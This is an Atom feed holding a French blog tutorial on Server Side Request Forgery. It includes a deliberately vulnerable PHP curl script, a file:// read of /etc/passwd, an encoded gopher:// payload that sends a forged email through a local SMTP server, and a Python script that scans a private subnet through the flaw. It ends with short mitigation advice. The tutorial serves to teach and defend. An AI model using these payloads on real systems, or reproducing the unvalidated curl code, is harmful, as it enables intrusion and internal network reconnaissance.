@@ -1,0 +1,174 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Daily Security - SSRF</title><link href="https://www.dailysecurity.fr/" rel="alternate"></link><link href="https://www.dailysecurity.fr/tag/ssrf/feed/index.xhtml" rel="self"></link><id>https://www.dailysecurity.fr/</id><updated>2017-09-16T00:40:00+02:00</updated><entry><title>Les Server Side Request Forgery : Comment contourner un pare-feu</title><link href="https://www.dailysecurity.fr/server-side-request-forgery" rel="alternate"></link><published>2017-09-16T00:40:00+02:00</published><updated>2017-09-16T00:40:00+02:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2017-09-16:/server-side-request-forgery</id><summary type="html">&lt;h2&gt;Qu'est ce que les Server Side Request Forgery ?&lt;/h2&gt;
+&lt;p&gt;Les &lt;strong&gt;Server Side Request Forgery&lt;/strong&gt;, ou en abrégé &lt;strong&gt;SSRF&lt;/strong&gt;, sont des vulnérabilités Web permettant de lire des fichiers sur le serveur &lt;strong&gt;local&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Il ne faut pas les confondre avec les &lt;strong&gt;CSRF&lt;/strong&gt; (Cross Site Request Forgery), qui, elles, ont pour but l'exécution d'une …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Qu'est ce que les Server Side Request Forgery ?&lt;/h2&gt;
+&lt;p&gt;Les &lt;strong&gt;Server Side Request Forgery&lt;/strong&gt;, ou en abrégé &lt;strong&gt;SSRF&lt;/strong&gt;, sont des vulnérabilités Web permettant de lire des fichiers sur le serveur &lt;strong&gt;local&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Il ne faut pas les confondre avec les &lt;strong&gt;CSRF&lt;/strong&gt; (Cross Site Request Forgery), qui, elles, ont pour but l'exécution d'une requête à l'insu d'un autre utilisateur.&lt;/p&gt;
+&lt;p&gt;Un des gros avantages des &lt;strong&gt;SSRF&lt;/strong&gt; est la possibilité de contourner les &lt;strong&gt;pare-feux&lt;/strong&gt;. &lt;/p&gt;
+&lt;p&gt;En effet, les actions se faisant côté serveur, il est possible d'interroger des services n'étant disponibles que localement tels que : &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Des bases de données NoSQL : Redis, MongoDB.&lt;/li&gt;
+&lt;li&gt;Des bases de données relationnelles : Oracle, MSSQL, MySQL, PostgreSQL.&lt;/li&gt;
+&lt;li&gt;Des services mail : Postfix, Dovecot.&lt;/li&gt;
+&lt;li&gt;Des services Web accessibles localement.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Ce genre de faille est particulièrement présent sur les proxy Web : Un utilisateur du service proxy peut avoir accès à des données internes au serveur, données auxquelles il n'aurait normalement pas du avoir accès.&lt;/p&gt;
+&lt;p&gt;Le schéma suivant montre un exemple d'attaque sur un proxy Web n'ayant pas protégé son adresse locale contre les &lt;strong&gt;SSRF&lt;/strong&gt; :&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Schéma SSRF Proxy" src="https://www.dailysecurity.fr/images/Schema_SSRF_Proxy.png"&gt;&lt;/p&gt;
+&lt;p&gt;On remarque que l'adresse locale est résolue côté serveur et permet à l'attaquant de récupérer le contenu du dossier &lt;em&gt;secret&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Voyons maintenant les différents types d'exploitation possibles en rapport avec les &lt;strong&gt;SSRF&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;Comment exploiter une SSRF : Les schémas d'attaque&lt;/h2&gt;
+&lt;p&gt;Nous avons vus précédemment l'exemple de l'exploitation d'un &lt;strong&gt;proxy Web&lt;/strong&gt;, mais il existe une multitude de schémas d'attaque.&lt;/p&gt;
+&lt;p&gt;L'exemple du proxy Web utilise le protocole HTTP pour accéder à des données internes.    &lt;/p&gt;
+&lt;p&gt;Nous sommes alors en droit de nous poser une question :  &lt;br&gt;
+&lt;em&gt;Comment faire pour communiquer avec les autres services (bases de données, services e-mail, etc...) ?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Prenons l'exemple suivant :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt; 
+
+&lt;span class="nv"&gt;$curl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;curl_init&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="nb"&gt;curl_setopt_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$curl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+    &lt;span class="nx"&gt;CURLOPT_URL&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="p"&gt;));&lt;/span&gt;
+
+&lt;span class="nv"&gt;$resp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;curl_exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$curl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nb"&gt;curl_close&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$curl&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Cet exemple prend en entrée une adresse et récupère la page associée, le module curl de PHP est une simple adaptation de la commande système &lt;code&gt;curl http://votreurl.com&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;On peut donc utiliser toutes les fonctionnalités de &lt;strong&gt;curl&lt;/strong&gt;, en particulier celles liées à la sémantique de l'adresse envoyée au script :
+&lt;code&gt;[protocole]://[IP|nomDeDomaine]:[port]/[param]&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le plus important, le protocole à utiliser : http, https, ftp, &lt;strong&gt;gopher&lt;/strong&gt;, &lt;strong&gt;file&lt;/strong&gt;, dict, etc.&lt;/li&gt;
+&lt;li&gt;L'adresse.&lt;/li&gt;
+&lt;li&gt;Le port distant.&lt;/li&gt;
+&lt;li&gt;Un ou plusieurs paramètres d'accès, par exemple un dossier ou un fichier.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;La liste des protocoles implémentés par curl est disponible &lt;a href="https://curl.haxx.se/docs/manpage.html"&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;h3&gt;Les protocoles &lt;em&gt;file://&lt;/em&gt; et &lt;em&gt;http://&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;Un protocole attire notre attention : le protocole &lt;em&gt;file://&lt;/em&gt; , celui-ci permet d'ouvrir un fichier sur le serveur. &lt;/p&gt;
+&lt;p&gt;En utilisant le script précédent, on peut essayer de lire le fichier /etc/passwd sur le serveur, ce qui donne en action : 
+&lt;img alt="SSRF File" src="https://www.dailysecurity.fr/images/SSRF_File.png"&gt;&lt;/p&gt;
+&lt;p&gt;Nous avons maintenant accès à n'importe quel fichier du serveur ! 
+&lt;img src="https://www.dailysecurity.fr/images/yes.gif" alt="Yes" style="width: 20%;"&gt;&lt;/p&gt;
+&lt;p&gt;Le protocole &lt;em&gt;file://&lt;/em&gt; nous a permis d'accéder à des fichiers mais &lt;em&gt;comment faire pour communiquer avec les différents services présents sur la machine ?&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;L'&lt;a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html"&gt;excellent article&lt;/a&gt; de &lt;a href="https://twitter.com/Agarri_FR"&gt;Nicolas Grégoire&lt;/a&gt; est un très bon exemple de &lt;strong&gt;SSRF&lt;/strong&gt; sur un service : la base de données NoSQL &lt;strong&gt;Redis&lt;/strong&gt;. &lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;, comme MongoDB, est une base de données NoSQL &lt;strong&gt;sans authentification&lt;/strong&gt; par défaut. &lt;/p&gt;
+&lt;p&gt;L'article explique comment, à l'aide de requêtes HTTP, &lt;em&gt;extraire&lt;/em&gt; des données de la base, &lt;em&gt;modifier&lt;/em&gt; cette dernière ou même &lt;em&gt;lire&lt;/em&gt; des fichiers sur le système.&lt;/p&gt;
+&lt;p&gt;Le principal souci de cette méthode est qu'une requête HTTP est obligée d'avoir un format spécifique afin d'être correcte : &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;GET /index.html&lt;/span&gt;
+&lt;span class="go"&gt;Host: www.dailysecurity.fr&lt;/span&gt;
+&lt;span class="go"&gt;User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&lt;/span&gt;
+&lt;span class="go"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
+&lt;span class="go"&gt;Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3&lt;/span&gt;
+&lt;span class="go"&gt;Accept-Encoding: gzip, deflate, br&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce format restreint l'exploitation de service, par exemple l'accès à un service qui a besoin d'un préambule bien précis.&lt;/p&gt;
+&lt;p&gt;Exemple d'accès à la base de données Redis avec une requête HTTP :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;-ERR wrong number of arguments for &amp;#39;get&amp;#39; command
+-ERR unknown command &amp;#39;Host:&amp;#39;
+-ERR unknown command &amp;#39;Accept:&amp;#39;
+-ERR unknown command &amp;#39;Accept-Encoding:&amp;#39;
+-ERR unknown command &amp;#39;Connection:&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Le protocole &lt;em&gt;gopher://&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;Afin de palier au problème de format, nous pouvons utiliser le protocole &lt;em&gt;gopher://&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Gopher_(protocol)"&gt;Gopher&lt;/a&gt; est un protocole concurrent de HTTP qui n'est plus vraiment utilisé mais toujours supporté par curl.&lt;/p&gt;
+&lt;p&gt;Il va nous permettre de communiquer avec les services type &lt;em&gt;telnet&lt;/em&gt; comme par exemple le service SMTP (e-mail) : &lt;br&gt;
+&lt;em&gt;ps : 1. Pour les sauts de ligne, on doit les encoder deux fois.&lt;/em&gt; &lt;br&gt;
+&lt;em&gt;2. La première lettre de la requête est aléatoire (x dans l'exemple) car non prise en compte par le protocole gopher.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;On cherche à envoyer un e-mail en utilisant le serveur SMTP disponible localement.&lt;/p&gt;
+&lt;p&gt;Contenu du message :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;HELO localhost
+MAIL FROM:&amp;lt;hacker@site.com&amp;gt;
+RCPT TO:&amp;lt;victim@site.com&amp;gt;
+DATA
+From: [Hacker] &amp;lt;hacker@site.com&amp;gt;
+To: &amp;lt;victime@site.com&amp;gt;
+Date: Tue, 15 Sep 2017 17:20:26 -0400
+Subject: Ah Ah AH
+
+You didn&amp;#39;t say the magic word !
+
+
+.
+QUIT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Ce qui donne en version Gopher : 
+&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ"&gt;https://victim.website/curl.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Pour tester notre &lt;strong&gt;SSRF&lt;/strong&gt;, on met en place un serveur netcat sur le port 25 (associé au protocole SMTP) et on attend la requête :     &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="go"&gt;nc -lvp 25&lt;/span&gt;
+&lt;span class="go"&gt;listening on [any] 25 ...&lt;/span&gt;
+&lt;span class="go"&gt;connect to [127.0.0.1] from localhost [127.0.0.1] 35417&lt;/span&gt;
+&lt;span class="go"&gt;HELO localhost&lt;/span&gt;
+&lt;span class="go"&gt;MAIL FROM:&amp;lt;hacker@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;RCPT TO:&amp;lt;victim@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;DATA&lt;/span&gt;
+&lt;span class="go"&gt;From: [Hacker] &amp;lt;hacker@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;To: &amp;lt;victime@site.com&amp;gt;&lt;/span&gt;
+&lt;span class="go"&gt;Date: Tue, 15 Sep 2017 17:20:26 -0400&lt;/span&gt;
+&lt;span class="go"&gt;Subject: AH AH AH&lt;/span&gt;
+
+&lt;span class="go"&gt;You didn&amp;#39;t say the magic word !&lt;/span&gt;
+
+
+&lt;span class="go"&gt;.&lt;/span&gt;
+&lt;span class="go"&gt;QUIT&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src="https://www.dailysecurity.fr/images/firewall.jpg" alt="Yes" style="width: 50%;"&gt;&lt;/p&gt;
+&lt;h3&gt;Une autre exemple d'utilisation des &lt;em&gt;SSRF&lt;/em&gt; : L'énumération d'adresses IP sur le réseau local&lt;/h3&gt;
+&lt;p&gt;Nous avons vu dans les parties précédentes que les  &lt;strong&gt;SSRF&lt;/strong&gt; jouaient le rôle de proxy afin d’exécuter des requêtes internes.&lt;/p&gt;
+&lt;p&gt;Elles peuvent alors servir d'outil pour l'énumération des machines dans les sous-réseaux accessibles.&lt;/p&gt;
+&lt;p&gt;La seule contrainte est que le machine à détecter doit avoir au moins un service ouvert.&lt;/p&gt;
+&lt;p&gt;Les services les plus communs sont le plus souvent des services Web ou SSH (ports 80, 443, 8080, 22) voire RDP (port 3389) sur Windows.&lt;/p&gt;
+&lt;p&gt;On peut deviner les sous-réseaux accessibles grâce aux fichiers de configuration de Apache ( &lt;code&gt;/etc/apache2/apache2.conf&lt;/code&gt;) ou en cherchant dans les plages d'adresses IP des réseaux privés :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;10.0.0.0/8&lt;/li&gt;
+&lt;li&gt;172.16.0.0/12&lt;/li&gt;
+&lt;li&gt;192.168.0.0/16&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Pour énumérer les machines disponibles ayant un service HTTP sur le port 80 on peut utiliser le script suivant :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ipRange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;start_ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end_ip&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+   &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_ip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+   &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end_ip&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+   &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;
+   &lt;span class="n"&gt;ip_range&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
+   &lt;span class="n"&gt;ip_range&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;start_ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+   &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+      &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+      &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+         &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+            &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
+            &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+      &lt;span class="n"&gt;ip_range&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;temp&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;    
+   &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ip_range&lt;/span&gt;
+
+&lt;span class="n"&gt;ip_range&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ipRange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.0.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.255.255&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;ip_up&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
+&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;ip_range&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://victime.website/curl.php?url=http://&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/:80&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+            &lt;span class="n"&gt;ip_up&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+            &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[+] Machine : &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;
+    &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="k"&gt;pass&lt;/span&gt;
+
+&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip_up&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;hr&gt;
+&lt;p&gt;Afin de &lt;strong&gt;sécuriser&lt;/strong&gt; une application contre les &lt;strong&gt;SSRF&lt;/strong&gt;, il faut vérifier :     &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Le &lt;em&gt;protocole&lt;/em&gt; utilisé : autoriser seulement &lt;em&gt;http&lt;/em&gt; et &lt;em&gt;https&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;L'adresse &lt;em&gt;IP&lt;/em&gt; liée à l'URL demandée ne doit pas faire partie d'un &lt;a href="https://fr.wikipedia.org/wiki/R%C3%A9seau_priv%C3%A9"&gt;réseau privé&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="SSRF"></category><category term="Failles Web"></category><category term="Tutoriel"></category></entry></feed>
